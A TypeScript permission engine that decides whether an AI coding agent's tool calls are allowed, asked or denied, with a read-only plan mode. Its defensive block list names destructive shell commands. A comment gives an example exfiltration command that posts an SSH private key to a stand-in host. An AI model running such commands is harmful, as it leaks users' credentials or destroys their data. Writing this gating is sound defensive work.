/**
 * PiPermissionEngine — pure, engine-neutral tool-gating decision for pi.
 *
 * pi has no native permission system (docs/protocol-pi/README.md
 * "Extensions"); PiSession.gateToolCall calls `decide()` on every `tool_call`
 * hook invocation with the session's live mode + the user's merged Claude
 * permission rules + a per-session "always allow" set, and turns the result
 * into an allow/deny/ask response for PiBridgeHost.
 *
 * Mirrors ADR-022's opencode ruleset semantics with an EVALUATOR instead of a
 * compiled ruleset (opencode patches a ruleset onto its own server; pi has no
 * server-side permission concept to patch, so ClaudeUI evaluates the same
 * rules itself, per tool_call, entirely in the main process).
 */
import type { ToolKind } from '../../shared/tool-kinds'
import { hostedMcpKind } from '../../shared/tool-kinds'
import type { ClaudePermissions, PermissionScope } from '../../shared/types'
import { loadClaudePermissions } from '../services/claude-settings'
import { parseClaudeRule } from '../opencode/permission-compiler'
import { logger } from '../services/logger'

export type PermissionDecision = 'allow' | 'ask' | 'deny'

/** The merged (user + project + local scope) Claude permission rule set. Same shape as ClaudePermissions — merging three scopes together yields no new fields. */
export type MergedClaudeRules = ClaudePermissions

export interface PermissionEngineContext {
  /** Claude-style permission-mode string, as arrives at PiSession.setPermissionMode: 'default' | 'acceptEdits' | 'plan' | 'auto' | ... */
  mode: string
  rules: MergedClaudeRules
  /** "Allow for this session" entries: bare pi tool name (e.g. 'edit'), or `bash:<normalized command>` for bash. */
  sessionAllows: ReadonlySet<string>
}

// ---------------------------------------------------------------------------
// piToolKind — SAME mapping as the renderer's PiEngineToolMap.kindOf
// ---------------------------------------------------------------------------

/**
 * Mirrors `PiEngineToolMap.kindOf` (src/renderer/.../PiEngineToolMap.ts) for
 * this engine's mode-base decisions. Main cannot import renderer code (they
 * are separate Electron processes/bundles), so this switch is intentionally
 * DUPLICATED here rather than shared — PiEngineToolMap.test.ts asserts the two
 * tables agree for every known pi tool name (single-source guard): a change to
 * one without the other fails that test.
 */
export function piToolKind(toolName: string): ToolKind {
  const mcpKind = hostedMcpKind(toolName)
  if (mcpKind !== null) return mcpKind

  switch (toolName) {
    case 'bash':
      return 'command'
    case 'edit':
      return 'fileEdit'
    case 'write':
      return 'fileWrite'
    case 'read':
      return 'fileRead'
    case 'grep':
    case 'find':
    case 'ls':
      return 'search'
    // Plan mode (M5a): the bridge extension's locally-executed exit_plan
    // tool (pi-bridge-source.ts, gated on CLAUDEUI_PI_PLAN_TOOLS) — reuses
    // the SAME 'plan' kind Claude's ExitPlanMode maps to (tool-kinds.ts),
    // so it gets its own mode-base treatment (planModeBaseDecision below)
    // and renders ExitPlanModeCard on the renderer side. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL case — the single-source guard
    // test (PiEngineToolMap.test.ts) asserts the two tables agree.
    case 'exit_plan':
      return 'plan'
    // Hosted tools (M4a+b) registered via pi.registerTool() in the bridge
    // extension use BARE names — hostedMcpKind above only matches `mcp__*`
    // prefixed names, so these need explicit cases here too. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL cases (renderer side) — the
    // single-source guard test (PiEngineToolMap.test.ts) asserts the two
    // tables agree for every known pi tool name.
    case 'render_mermaid':
      return 'diagram'
    case 'create_mockup':
    case 'show_mockup':
      return 'mockup'
    case 'dispatch_agent':
      return 'task'
    default:
      return 'unknown'
  }
}

// ---------------------------------------------------------------------------
// Hosted-tool auto-allow (M4a)
// ---------------------------------------------------------------------------

/**
 * Hosted LLM tools (M4a) — ClaudeUI's own render_mermaid/create_mockup/
 * show_mockup, registered via pi.registerTool() over the bridge (see
 * pi-bridge-source.ts + PiBridgeHost's /hosted-tool route). ALWAYS ALLOWED —
 * parity with Claude's auto-allowed `mcp__claude-ui__` prefix and opencode's
 * silent `{*:allow}` baseline for the same tools. Checked in decide() AFTER
 * deny rules (a user's explicit deny still wins — see decide()'s doc
 * comment) but BEFORE ask/sessionAllows/allow/mode-base, so these three
 * never prompt or fall through the ladder.
 *
 * `dispatch_agent` is deliberately NOT in this set: it gets NORMAL gating
 * (falls through to mode base), matching Claude routing dispatch_agent
 * through its own separate, non-auto-allowed `claude-ui-collab` MCP server
 * (collab-tool.ts) rather than the auto-allowed `claude-ui` one.
 */
export const PI_AUTO_ALLOW_HOSTED_TOOLS: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup'
])

/**
 * ALL FOUR tools registered via `pi.registerTool()` in the bridge extension
 * (M4a+b) — PI_AUTO_ALLOW_HOSTED_TOOLS above is a STRICT SUBSET (the three
 * auto-allowed ones; `dispatch_agent` gets normal mode-base gating instead,
 * see PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment for why). PiSession's
 * gateToolCall wrapper checks THIS superset — not the auto-allow set — to
 * decide which allow decisions mint a one-shot `/hosted-tool` execution grant
 * (security fix: a call outside this set has no `/hosted-tool` counterpart to
 * ever execute, so no grant is needed or minted for it).
 */
export const PI_HOSTED_TOOL_NAMES: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup',
  'dispatch_agent'
])

// ---------------------------------------------------------------------------
// Claude rule string -> pi kind mapping (for evaluating the user's rules)
// ---------------------------------------------------------------------------

/**
 * Claude canonical tool name -> pi ToolKind, for matching the user's
 * Tool(specifier) rule strings against a pi tool_call. LS is included
 * alongside Grep/Glob (all three collapse to pi's single 'search' kind,
 * pi's `ls`/`grep`/`find` tools) for parity with opencode's own
 * TOOL_TO_CATEGORY table (permission-compiler.ts), which treats Read/Glob/
 * Grep/LS as siblings. Any Claude tool name NOT in this table (WebFetch,
 * Task, NotebookEdit, MultiEdit, ...) has no pi analog and never matches.
 */
const CLAUDE_TOOL_TO_KIND: Record<string, ToolKind> = {
  Bash: 'command',
  Edit: 'fileEdit',
  Write: 'fileWrite',
  Read: 'fileRead',
  Grep: 'search',
  Glob: 'search',
  LS: 'search'
}

/** Reverse of the above, for building "always allow" suggestions from a pi tool_call (PiSession). */
export const PI_TOOL_TO_CLAUDE_TOOL: Record<string, string> = {
  bash: 'Bash',
  edit: 'Edit',
  write: 'Write',
  read: 'Read',
  grep: 'Grep',
  find: 'Glob',
  ls: 'LS'
}

/** Trim + collapse internal whitespace runs, for comparing bash commands. */
export function normalizeWhitespace(s: string): string {
  return s.trim().replace(/\s+/g, ' ')
}

function bashSpecifierMatches(specifier: string, input: Record<string, unknown>): boolean {
  const command = normalizeWhitespace(String(input.command ?? ''))
  const prefixMatch = specifier.match(/^(.+):\*$/)
  if (prefixMatch) {
    return command.startsWith(normalizeWhitespace(prefixMatch[1]))
  }
  return command === normalizeWhitespace(specifier)
}

// Debug-log de-duplication for skipped path-glob-style rules — process-scoped
// (not strictly per-PiSession-instance; decide() takes no session identity to
// key a finer-grained cache on, and repeating this debug line across sessions
// in the same long-lived Electron process is harmless noise, not a bug).
const loggedSkippedRules = new Set<string>()

/**
 * Does a single Claude rule string match this pi tool_call? Bare tool rules
 * (no specifier) match unconditionally for the mapped kind. Bash specifiers
 * are evaluated (prefix `cmd:*` / exact, whitespace-normalized). Any OTHER
 * specifier (path-glob rules like `Edit(src/**)`, or a Grep/Glob pattern) is
 * NOT evaluated in M2a — logged once (debug) and skipped, which correctly
 * falls through to the next tier rather than ever default-allowing.
 * M3: path-glob rules.
 */
function ruleMatchesTool(rule: string, kind: ToolKind, input: Record<string, unknown>): boolean {
  const parsed = parseClaudeRule(rule)
  if (!parsed) return false
  const mappedKind = CLAUDE_TOOL_TO_KIND[parsed.tool]
  if (!mappedKind || mappedKind !== kind) return false

  if (parsed.specifier === undefined) return true

  if (mappedKind === 'command') {
    return bashSpecifierMatches(parsed.specifier, input)
  }

  if (!loggedSkippedRules.has(rule)) {
    loggedSkippedRules.add(rule)
    logger.debug('PiPermissionEngine', `Skipping unevaluated specifier rule "${rule}" (path-glob rules land in M3)`)
  }
  return false
}

/** First rule in `rules` that matches this tool_call, or undefined. Used to build a human-readable deny reason. */
export function firstMatchingRule(
  rules: readonly string[],
  toolName: string,
  input: Record<string, unknown>
): string | undefined {
  const kind = piToolKind(toolName)
  return rules.find((r) => ruleMatchesTool(r, kind, input))
}

/** The "allow for this session" dedup key for a tool_call — bash is scoped by its (normalized) command, everything else by bare tool name. */
export function sessionAllowKey(toolName: string, input: Record<string, unknown>): string {
  if (toolName === 'bash') return `bash:${normalizeWhitespace(String(input.command ?? ''))}`
  return toolName
}

// ---------------------------------------------------------------------------
// Mode base
// ---------------------------------------------------------------------------

/**
 * Mode-base decision BEFORE user rules / sessionAllows are considered:
 *  - kind 'plan' (exit_plan) OUTSIDE mode 'plan' -> deny in EVERY mode —
 *    including full/auto/bypassPermissions' otherwise allow-everything base.
 *    This is full mode's ONE carve-out (M5a addendum): pi.registerTool()
 *    auto-activates the tool, so exit_plan is model-visible from spawn in
 *    every mode until the bridge extension's session_start hook hides it,
 *    and a mode-transition tool must not be model-invocable when there is
 *    no mode to exit (an auto-allowed exit_plan in full mode would return
 *    "Plan approved — proceeding." for a plan that never existed). Mirrors
 *    cli.js never offering ExitPlanMode outside plan mode.
 *  - default            -> fileRead/search allow, everything else ask
 *  - acceptEdits         -> also fileEdit/fileWrite allow, bash/unknown ask
 *  - bypassPermissions/full/auto -> allow everything (except the plan-kind carve-out above)
 *  - plan (M5a — real autonomy mode now, see planModeBaseDecision) -> read-only:
 *    reads/search allow, exit_plan asks, bash gated by isPlanSafeBashCommand,
 *    everything else (fileEdit/fileWrite/task/unknown/…) denies outright
 *  - any other/unrecognised mode string -> treat as default (fail toward asking, not allowing)
 */
function modeBaseDecision(mode: string, kind: ToolKind, input: Record<string, unknown>): 'allow' | 'ask' | 'deny' {
  if (kind === 'plan' && mode !== 'plan') return 'deny'
  switch (mode) {
    case 'bypassPermissions':
    case 'full':
    case 'auto':
      return 'allow'
    case 'acceptEdits':
      return kind === 'fileRead' || kind === 'search' || kind === 'fileEdit' || kind === 'fileWrite'
        ? 'allow'
        : 'ask'
    case 'plan':
      return planModeBaseDecision(kind, input)
    case 'default':
    default:
      return kind === 'fileRead' || kind === 'search' ? 'allow' : 'ask'
  }
}

// ---------------------------------------------------------------------------
// Plan mode (M5a) — read-only autonomy enforced by BOTH the bridge extension
// (pi-bridge-source.ts's exit_plan/cui-plan-enter/cui-plan-exit — the model
// literally never sees edit/write while planning) and this gate (defense in
// depth, and the ONLY place bash gets a command-level allowlist instead of a
// blanket ask/deny). Precedence is unchanged: an explicit user deny/ask RULE
// (checked earlier in decide(), see its doc comment) still overrides
// everything below, and the hosted three (render_mermaid/create_mockup/
// show_mockup) auto-allow before mode base is ever consulted — they don't
// mutate the repo, so they stay available in plan mode.
// ---------------------------------------------------------------------------

/**
 * Denial reason for every plan-mode-BASE deny (a mutating kind, or an
 * unsafe/unrecognized bash command) — model-actionable, points it at the
 * exit_plan tool. An explicit user deny RULE produces its OWN, more specific
 * "Denied by permission rule: …" reason (PiSession.gateToolCallInner checks
 * that first) — this is only the mode-base fallback.
 */
export const PLAN_MODE_DENY_REASON = 'Plan mode is read-only — present a plan and call exit_plan to proceed'

/**
 * Denial reason for an exit_plan call OUTSIDE plan mode (M5a addendum) —
 * pi.registerTool() auto-activates the tool, so exit_plan is model-visible
 * from spawn in every mode until the bridge extension's session_start hook
 * hides it; this gate deny is the backstop. Wired in
 * PiSession.gateToolCallInner the same way PLAN_MODE_DENY_REASON is.
 */
export const PLAN_EXIT_OUTSIDE_PLAN_REASON = 'exit_plan is only available in plan mode'

/**
 * Destructive-anywhere-in-the-string bash patterns — ported VERBATIM from
 * vendor/pi-cli/examples/extensions/plan-mode/utils.ts's DESTRUCTIVE_PATTERNS
 * (the pi-shipped reference implementation this milestone's kickoff spec
 * pointed at). Unanchored word-boundary matches: a destructive token ANYWHERE
 * in a chained command (`ls && rm -rf /`, `echo hi; git commit -m x`) blocks
 * the WHOLE command. This scan is the FIRST check in isPlanSafeBashCommand;
 * the per-segment safe-list validation below is the second — a chained
 * command must clear both.
 */
const PLAN_DESTRUCTIVE_PATTERNS: RegExp[] = [
  /\brm\b/i,
  /\brmdir\b/i,
  /\bmv\b/i,
  /\bcp\b/i,
  /\bmkdir\b/i,
  /\btouch\b/i,
  /\bchmod\b/i,
  /\bchown\b/i,
  /\bchgrp\b/i,
  /\bln\b/i,
  /\btee\b/i,
  /\btruncate\b/i,
  /\bdd\b/i,
  /\bshred\b/i,
  /(^|[^<])>(?!>)/,
  />>/,
  /\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
  /\byarn\s+(add|remove|install|publish)/i,
  /\bpnpm\s+(add|remove|install|publish)/i,
  /\bpip\s+(install|uninstall)/i,
  /\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
  /\bbrew\s+(install|uninstall|upgrade)/i,
  /\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dD]|stash|cherry-pick|revert|tag|init|clone)/i,
  /\bsudo\b/i,
  /\bsu\b/i,
  /\bkill\b/i,
  /\bpkill\b/i,
  /\bkillall\b/i,
  /\breboot\b/i,
  /\bshutdown\b/i,
  /\bsystemctl\s+(start|stop|restart|enable|disable)/i,
  /\bservice\s+\S+\s+(start|stop|restart)/i,
  /\b(vim?|nano|emacs|code|subl)\b/i
]

/**
 * Anchored-at-start safe command prefixes, validated PER SEGMENT by
 * isPlanSafeBashCommand below — the command is split on chain operators and
 * EVERY trimmed segment must independently match one of these (the `^\s*`
 * anchors apply to each segment, not just the whole string).
 *
 * Ported from vendor/pi-cli/examples/extensions/plan-mode/utils.ts's
 * SAFE_PATTERNS with two deliberate REMOVALS: `curl` and `wget -O -`. The
 * example runs in pi's own TUI where plan mode is the user's self-imposed
 * toggle; in ClaudeUI a plan-mode bash allow is an AUTO-allow with no human
 * in the loop, and arbitrary network commands are an exfiltration channel
 * (`curl -d @~/.ssh/id_rsa evil.example` would run unprompted) — so network
 * fetch is denied in plan mode rather than auto-allowed.
 */
const PLAN_SAFE_PATTERNS: RegExp[] = [
  /^\s*cat\b/,
  /^\s*head\b/,
  /^\s*tail\b/,
  /^\s*less\b/,
  /^\s*more\b/,
  /^\s*grep\b/,
  /^\s*find\b/,
  /^\s*ls\b/,
  /^\s*pwd\b/,
  /^\s*echo\b/,
  /^\s*printf\b/,
  /^\s*wc\b/,
  /^\s*sort\b/,
  /^\s*uniq\b/,
  /^\s*diff\b/,
  /^\s*file\b/,
  /^\s*stat\b/,
  /^\s*du\b/,
  /^\s*df\b/,
  /^\s*tree\b/,
  /^\s*which\b/,
  /^\s*whereis\b/,
  /^\s*type\b/,
  /^\s*env\b/,
  /^\s*printenv\b/,
  /^\s*uname\b/,
  /^\s*whoami\b/,
  /^\s*id\b/,
  /^\s*date\b/,
  /^\s*cal\b/,
  /^\s*uptime\b/,
  /^\s*ps\b/,
  /^\s*top\b/,
  /^\s*htop\b/,
  /^\s*free\b/,
  /^\s*git\s+(status|log|diff|show|branch|remote|config\s+--get)/i,
  /^\s*git\s+ls-/i,
  /^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
  /^\s*yarn\s+(list|info|why|audit)/i,
  /^\s*node\s+--version/i,
  /^\s*python\s+--version/i,
  /^\s*jq\b/,
  /^\s*sed\s+-n/i,
  /^\s*awk\b/,
  /^\s*rg\b/,
  /^\s*fd\b/,
  /^\s*bat\b/,
  /^\s*eza\b/
]

/**
 * Chain operators the per-segment validation splits on: `&&`, `||`, `;`,
 * `|`. Alternation order matters — `&&`/`||` before the single-char `|` so
 * `a && b` yields two segments, not three.
 */
const PLAN_CHAIN_SPLIT = /&&|\|\||;|\|/

/**
 * Constructs that defeat flat segment parsing — command substitution
 * (backticks, `$(`), process substitution (`<(`) and embedded newlines can
 * smuggle an arbitrary nested command past the per-segment check, so their
 * mere presence denies the whole command.
 */
const PLAN_UNPARSEABLE = /[`\n]|\$\(|<\(/

/**
 * Is `command` allowed in plan mode's bash gate? A plan-mode bash allow is
 * an AUTO-allow — no human in the loop (default mode would at least ask) —
 * so this is strictly deny-when-unsure, three checks in order:
 *
 *  1. Any destructive pattern ANYWHERE in the string denies
 *     (PLAN_DESTRUCTIVE_PATTERNS — catches chained/embedded mutations like
 *     `ls && rm -rf /` regardless of segment parsing).
 *  2. Any parse-defeating construct (backticks, `$(`, `<(`, newlines)
 *     denies outright (PLAN_UNPARSEABLE).
 *  3. The command is split on `&&`/`||`/`;`/`|` and EVERY trimmed segment
 *     must be non-empty AND match a PLAN_SAFE_PATTERN — a chain is only as
 *     safe as its least safe segment. An empty or unrecognized command
 *     matches no SAFE_PATTERN and is denied; a trailing operator (`ls &&`)
 *     leaves an empty segment and is denied.
 *
 * Known over-denial (accepted — it errs toward deny, never toward allow):
 * the splitter is quote-blind, so a chain operator INSIDE a quoted argument
 * over-splits — `grep "a && b" file.txt` becomes segments `grep "a` /
 * `b" file.txt`, and the second fails the safe check. The model receives
 * the plan-mode deny reason and can rephrase the query.
 */
export function isPlanSafeBashCommand(command: string): boolean {
  if (PLAN_DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) return false
  if (PLAN_UNPARSEABLE.test(command)) return false
  return command.split(PLAN_CHAIN_SPLIT).every((segment) => {
    const trimmed = segment.trim()
    return trimmed.length > 0 && PLAN_SAFE_PATTERNS.some((p) => p.test(trimmed))
  })
}

/**
 * Plan mode's own base (M5a) — read-only autonomy: reads/search always
 * allow; the 'plan' kind (exit_plan itself) always asks — that's the
 * approval that renders ExitPlanModeCard; bash is allow/deny by
 * isPlanSafeBashCommand; every other kind (fileEdit/fileWrite/task/mcp/
 * unknown/…) denies outright — plan mode has no interactive 'ask' tier of
 * its own beyond exit_plan (an explicit user ask/deny RULE still overrides
 * this, checked earlier in decide()).
 */
function planModeBaseDecision(kind: ToolKind, input: Record<string, unknown>): 'allow' | 'ask' | 'deny' {
  if (kind === 'fileRead' || kind === 'search') return 'allow'
  if (kind === 'plan') return 'ask'
  if (kind === 'command') return isPlanSafeBashCommand(String(input.command ?? '')) ? 'allow' : 'deny'
  return 'deny'
}

// ---------------------------------------------------------------------------
// decide()
// ---------------------------------------------------------------------------

/**
 * Decide allow/ask/deny for one pi tool_call.
 *
 * Precedence — severity wins, deny(3) > hosted-auto-allow > ask(2) >
 * allow(1): any matching deny rule -> 'deny'; else a hosted LLM tool
 * (PI_AUTO_ALLOW_HOSTED_TOOLS, M4a) -> 'allow'; else any matching ask rule ->
 * 'ask'; else sessionAllows or a matching allow rule -> 'allow'; else the
 * mode base. This mirrors Claude's own deny > ask > allow precedence
 * (ADR-022 gives opencode the identical property) and keeps a deny/ask rule
 * meaningful even in `full` mode — an "allow everything" autonomy mode is
 * still not a bypass of an explicit user rule. The hosted-tool short-circuit
 * sits directly below deny (so an explicit user deny still wins) and above
 * everything else (so render_mermaid/create_mockup/show_mockup never prompt
 * or depend on mode/rules) — see PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment.
 */
export function decide(
  toolName: string,
  input: Record<string, unknown>,
  ctx: PermissionEngineContext
): PermissionDecision {
  const kind = piToolKind(toolName)

  if (ctx.rules.deny.some((r) => ruleMatchesTool(r, kind, input))) return 'deny'
  if (PI_AUTO_ALLOW_HOSTED_TOOLS.has(toolName)) return 'allow'
  if (ctx.rules.ask.some((r) => ruleMatchesTool(r, kind, input))) return 'ask'
  if (ctx.sessionAllows.has(sessionAllowKey(toolName, input))) return 'allow'
  if (ctx.rules.allow.some((r) => ruleMatchesTool(r, kind, input))) return 'allow'

  return modeBaseDecision(ctx.mode, kind, input)
}

// ---------------------------------------------------------------------------
// Rule loading
// ---------------------------------------------------------------------------

/**
 * Exported (ADR-033 M4c): a pi cross-engine dispatch TARGET's gate uses this
 * verbatim as its `decide()` rules — a dispatched target should not inherit
 * the user's interactive-session Claude permission rules (only the target's
 * fixed autonomy mode governs it). See cross-engine-dispatcher.ts's
 * `gatePiTargetToolCall`.
 *
 * Frozen — object AND every array property — since this is a SHARED singleton
 * every caller reads by reference: without freezing, one caller mutating
 * `EMPTY_RULES.allow` in place (e.g. via `.push()`) would silently corrupt it
 * for every other caller for the lifetime of the process. `mergedClaudeRulesFor`'s
 * catch path below deliberately does NOT return this object (or a shallow
 * `{...EMPTY_RULES}` of it, which would still share these same frozen array
 * references) — a caller of THAT function is allowed to treat its result as
 * mutable.
 */
export const EMPTY_RULES: MergedClaudeRules = Object.freeze({
  allow: Object.freeze([] as string[]) as string[],
  deny: Object.freeze([] as string[]) as string[],
  ask: Object.freeze([] as string[]) as string[],
  additionalDirectories: Object.freeze([] as string[]) as string[],
  defaultMode: undefined
})

/**
 * Merge the user/project/local Claude permission scopes for `cwd` (mirrors
 * OpencodeSession.compiledUserRules' identical 3-scope merge — ADR-022
 * parity: "one config applies to all harnesses"). Best-effort: any failure
 * yields empty rules rather than breaking gating.
 */
export function mergedClaudeRulesFor(cwd: string): MergedClaudeRules {
  try {
    const merged: MergedClaudeRules = {
      allow: [],
      deny: [],
      ask: [],
      additionalDirectories: [],
      defaultMode: undefined
    }
    const scopes: PermissionScope[] = ['user', 'project', 'local']
    for (const scope of scopes) {
      const p = loadClaudePermissions(scope, cwd)
      merged.allow.push(...p.allow)
      merged.deny.push(...p.deny)
      merged.ask.push(...p.ask)
      merged.additionalDirectories.push(...p.additionalDirectories)
    }
    return merged
  } catch (err) {
    logger.warn(
      'PiPermissionEngine',
      `mergedClaudeRulesFor failed (best-effort -> empty rules): ${err instanceof Error ? err.message : String(err)}`
    )
    // A fresh literal, NOT `{ ...EMPTY_RULES }` — a shallow spread would copy
    // the top-level object but still alias EMPTY_RULES' (frozen) arrays,
    // handing the caller a result that throws on mutation despite this
    // function's contract being "best-effort mutable rules".
    return { allow: [], deny: [], ask: [], additionalDirectories: [], defaultMode: undefined }
  }
}
